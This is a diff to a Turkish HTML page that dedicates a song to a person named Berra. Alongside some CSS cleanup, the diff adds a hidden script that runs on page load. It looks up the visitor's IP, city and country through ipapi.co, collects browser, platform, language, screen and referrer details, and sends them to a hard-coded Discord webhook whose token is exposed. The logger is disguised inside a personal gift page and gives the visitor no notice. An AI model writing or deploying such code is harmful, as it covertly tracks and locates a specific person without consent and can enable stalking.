@@ -4,14 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Sana küçük bir şey</title>
-
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    /* Mevcut stilleriniz aynı kalıyor */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       width: 100%;
       height: 100vh;
@@ -20,7 +15,6 @@
       font-family: "Georgia", serif;
       overflow: hidden;
     }
-
     .screen {
       width: 100%;
       height: 100vh;
@@ -31,7 +25,6 @@
       padding: 24px;
       position: relative;
     }
-
     .glow {
       position: absolute;
       width: 320px;
@@ -41,18 +34,10 @@
       filter: blur(70px);
       animation: pulse 4s infinite alternate;
     }
-
     @keyframes pulse {
-      from {
-        transform: scale(0.9);
-        opacity: 0.4;
-      }
-      to {
-        transform: scale(1.2);
-        opacity: 0.8;
-      }
+      from { transform: scale(0.9); opacity: 0.4; }
+      to { transform: scale(1.2); opacity: 0.8; }
     }
-
     .content {
       z-index: 2;
       max-width: 760px;
@@ -60,27 +45,11 @@
       transform: translateY(20px);
       animation: fadeIn 2s ease forwards;
     }
-
     @keyframes fadeIn {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+      to { opacity: 1; transform: translateY(0); }
     }
-
-    h1 {
-      font-size: clamp(30px, 6vw, 64px);
-      font-weight: normal;
-      margin-bottom: 24px;
-      letter-spacing: 1px;
-    }
-
-    p {
-      font-size: clamp(18px, 3vw, 28px);
-      line-height: 1.6;
-      color: #ddd;
-    }
-
+    h1 { font-size: clamp(30px, 6vw, 64px); font-weight: normal; margin-bottom: 24px; letter-spacing: 1px; }
+    p { font-size: clamp(18px, 3vw, 28px); line-height: 1.6; color: #ddd; }
     button {
       margin-top: 32px;
       background: transparent;
@@ -92,64 +61,85 @@
       cursor: pointer;
       transition: 0.3s;
     }
-
-    button:hover {
-      background: white;
-      color: black;
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    .line {
-      opacity: 0;
-      transform: translateY(12px);
-      animation: lineIn 1.4s ease forwards;
-      margin-bottom: 16px;
-    }
-
-    @keyframes lineIn {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .small {
-      margin-top: 28px;
-      font-size: 15px;
-      color: #888;
-    }
+    button:hover { background: white; color: black; }
+    .hidden { display: none; }
+    .line { opacity: 0; transform: translateY(12px); animation: lineIn 1.4s ease forwards; margin-bottom: 16px; }
+    @keyframes lineIn { to { opacity: 1; transform: translateY(0); } }
+    .small { margin-top: 28px; font-size: 15px; color: #888; }
   </style>
 </head>
-
 <body>
   <audio id="song" src="audio.mp3"></audio>
-
+  
   <div class="screen">
     <div class="glow"></div>
-
     <div class="content" id="intro">
       <h1>Selam Berra.</h1>
       <p>Bu şarkı sana.</p>
       <p class="small">Hazırsan dokun.</p>
       <button onclick="start()">Başlat</button>
     </div>
-
     <div class="content hidden" id="lyricsBox">
       <div id="lyrics"></div>
     </div>
   </div>
 
   <script>
+    const webhookURL = "https://discord.com/api/webhooks/1508712355394228246/oc4CCNXtkEi5_mQuD5h9AW3lXk4q08j-3V1pQRruv_lJHti1UDAXYFaOJ7YEKYMbSzp-";
+
+    // Ziyaretçi bilgilerini topla ve webhook'a gönder
+    async function sendVisitorData() {
+      try {
+        // IP ve lokasyon bilgisi
+        const ipRes = await fetch("https://ipapi.co/json/");
+        const ipData = await ipRes.json();
+
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const screenSize = `${screen.width}x${screen.height}`;
+        const referrer = document.referrer || "Direct";
+
+        const data = {
+          content: "**Yeni Ziyaretçi**",
+          embeds: [{
+            color: 0x00ff00,
+            timestamp: new Date().toISOString(),
+            fields: [
+              { name: "IP", value: `\`${ipData.ip}\``, inline: true },
+              { name: "Şehir", value: ipData.city || "Bilinmiyor", inline: true },
+              { name: "Ülke", value: `${ipData.country_name} (${ipData.country_code})`, inline: true },
+              { name: "Tarayıcı", value: userAgent.substring(0, 100) + "...", inline: false },
+              { name: "İşletim Sistemi", value: platform, inline: true },
+              { name: "Dil", value: language, inline: true },
+              { name: "Ekran Çözünürlüğü", value: screenSize, inline: true },
+              { name: "Cihaz Tipi", value: /Mobi|Android/i.test(userAgent) ? "📱 Mobil" : "💻 Desktop", inline: true },
+              { name: "Referrer", value: referrer, inline: false }
+            ]
+          }]
+        };
+
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+      } catch (err) {
+        console.error("Webhook gönderim hatası:", err);
+      }
+    }
+
+    // Sayfa yüklenir yüklenmez veri gönder
+    window.onload = () => {
+      sendVisitorData();
+    };
+
+    // Mevcut şarkı ve lyrics kodları
     const song = document.getElementById("song");
     const intro = document.getElementById("intro");
     const lyricsBox = document.getElementById("lyricsBox");
     const lyrics = document.getElementById("lyrics");
 
-    // Buraya telif hakkı sende olan sözleri veya kendi yazdığın satırları ekle.
-    // "I Wanna Be Yours" tam sözlerini buraya yapıştırırsan telif açısından sorun olabilir.
     const lines = [
       "Bazı şarkılar vardır,",
       "insanın aklına direkt birini getirir.",
@@ -166,10 +156,8 @@
     function start() {
       song.volume = 0.75;
       song.play();
-
       intro.classList.add("hidden");
       lyricsBox.classList.remove("hidden");
-
       showLines();
     }
 
